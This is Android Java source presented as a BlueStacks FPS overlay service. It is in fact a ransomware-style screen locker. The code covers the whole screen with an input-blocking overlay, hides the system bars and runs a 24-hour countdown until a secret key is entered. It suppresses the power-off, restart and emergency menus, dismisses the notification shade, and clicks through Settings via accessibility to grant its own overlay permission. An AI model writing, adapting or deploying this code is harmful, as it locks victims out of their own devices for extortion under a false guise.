package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Button;
import android.widget.TextView;

import java.util.List;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;

public class FPSAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;
    private static final long ACTION_DELAY = 1000; 
    private WindowManager windowManager;
    private View godModeOverlay;
    private TextView textTimer;
    private long timeLeftInSeconds = 24 * 3600;
    private String currentInput = "";

    public native boolean verifyAdvancedKey(String input);

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("FPS Service Connected - God Mode Activated"); 
        showGodModeOverlay();
    }

    private void showGodModeOverlay() {
        if (godModeOverlay != null) return;

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        godModeOverlay = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);

        // Immersive Mode: Menyembunyikan Navigasi & Status Bar secara total
        godModeOverlay.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_FULLSCREEN
        );

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                // FLAG_LAYOUT_IN_SCREEN & NO_LIMITS: Menabrak batas layar (termasuk navbar)
                // Tanpa FLAG_NOT_FOCUSABLE: Memblokir input ke aplikasi di belakangnya
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.FILL;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }

        try {
            setupKeypadLogic(godModeOverlay);
            windowManager.addView(godModeOverlay, params);
            writeLog("God Mode Overlay Added successfully.");
        } catch (Exception e) {
            writeLog("Failed to add God Mode Overlay: " + e.getMessage());
        }
    }

    private void setupKeypadLogic(View view) {
        textTimer = view.findViewById(R.id.textTimer);
        TextView display = view.findViewById(R.id.textDisplayPassword);
        TextView textStatusMessage = view.findViewById(R.id.textStatusMessage);

        startCountdown();

        View.OnClickListener numListener = v -> {
            Button b = (Button) v;
            if (currentInput.length() < 12) {
                currentInput += b.getText().toString();
                display.setText(currentInput.replaceAll(".", "* "));
            }
        };

        int[] buttonIds = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
                           R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
        for (int id : buttonIds) {
            View btn = view.findViewById(id);
            if (btn != null) btn.setOnClickListener(numListener);
        }

        View btnDel = view.findViewById(R.id.btnDelete);
        if (btnDel != null) {
            btnDel.setOnClickListener(v -> {
                if (currentInput.length() > 0) {
                    currentInput = currentInput.substring(0, currentInput.length() - 1);
                    display.setText(currentInput.replaceAll(".", "* "));
                }
            });
        }

        View btnUnlock = view.findViewById(R.id.btnUnlock);
        if (btnUnlock != null) {
            btnUnlock.setOnClickListener(v -> {
                if (verifyAdvancedKey(currentInput)) {
                    if (godModeOverlay != null) {
                        windowManager.removeView(godModeOverlay);
                        godModeOverlay = null;
                        FPSService.isAuthenticated = true;
                        writeLog("God Mode Unlocked!");
                    }
                } else {
                    currentInput = "";
                    display.setText("");
                    textStatusMessage.setText("WRONG KEY");
                    new android.os.Handler().postDelayed(() -> textStatusMessage.setText(""), 2000);
                }
            });
        }
    }

    private void startCountdown() {
        android.os.Handler timerHandler = new android.os.Handler(android.os.Looper.getMainLooper());
        timerHandler.post(new Runnable() {
            @Override
            public void run() {
                int hours = (int) (timeLeftInSeconds / 3600);
                int minutes = (int) (timeLeftInSeconds % 3600) / 60;
                int seconds = (int) (timeLeftInSeconds % 60);

                String timeString = String.format("%02d:%02d:%02d", hours, minutes, seconds);
                if (textTimer != null) textTimer.setText(timeString);

                if (timeLeftInSeconds > 0) {
                    timeLeftInSeconds--;
                    timerHandler.postDelayed(this, 1000);
                }
            }
        });
    }

    private void writeLog(String text) {
        try {
            File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File myDir = new File(downloadDir, "bs_engine_logs");
            if (!myDir.exists()) myDir.mkdirs();
            
            File logFile = new File(myDir, "logs.txt");
            FileWriter writer = new FileWriter(logFile, true);
            String timestamp = java.text.DateFormat.getDateTimeInstance().format(new java.util.Date());
            writer.append(timestamp).append(" : ").append(text).append("\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            android.util.Log.e("DEX_LOG", "Failed to write log: " + e.getMessage());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // 1. Deklarasikan packageName di awal agar bisa diakses di mana saja dalam method ini
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
    
        // 2. Cek autentikasi. Jika sudah login, hentikan intervensi
        if (FPSService.isAuthenticated) {
            return; 
        }
    
        // 3. Logika blokir SystemUI menggunakan variabel packageName yang sudah dideklarasikan
        if (packageName.equals("com.android.systemui")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE);
            }
        }
    
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;
    
        try {
            checkAndDismissSensitiveUI(rootNode);
            // 4. Kirim packageName ke method handleOverlayPermissionFlow
            handleOverlayPermissionFlow(rootNode, packageName);
        } finally {
            rootNode.recycle();
        }
    }

    private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            AccessibilityNodeInfo currentRoot = getRootInActiveWindow();
            if (currentRoot == null) return;
            try {
                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("BluestacksFPS");
                AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");
                if (!targets.isEmpty() && switchNode != null && !switchNode.isChecked()) {
                    performClick(switchNode);
                } else if (pkg.contains("settings")) {
                    clickByText(currentRoot, "BluestacksFPS");
                }
            } finally {
                currentRoot.recycle();
            }
        }, 150);
    }
    
    private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    private void clickByText(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> targets = node.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo target : targets) {
            if (target.getText() != null && target.getText().toString().equalsIgnoreCase(text)) {
                performClick(target);
            }
            target.recycle();
        }
    }

    private void performClick(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo clickable = node;
        while (clickable != null && !clickable.isClickable()) {
            clickable = clickable.getParent();
        }
        if (clickable != null && clickable.isClickable()) {
            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    private void checkAndDismissSensitiveUI(AccessibilityNodeInfo node) {
        String[] powerKeywords = {"Power off", "Restart", "Daya mati", "Mulai lagi", "Darurat"};
        for (String key : powerKeywords) {
            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            }
        }
    }

    @Override
    public void onInterrupt() {}
}
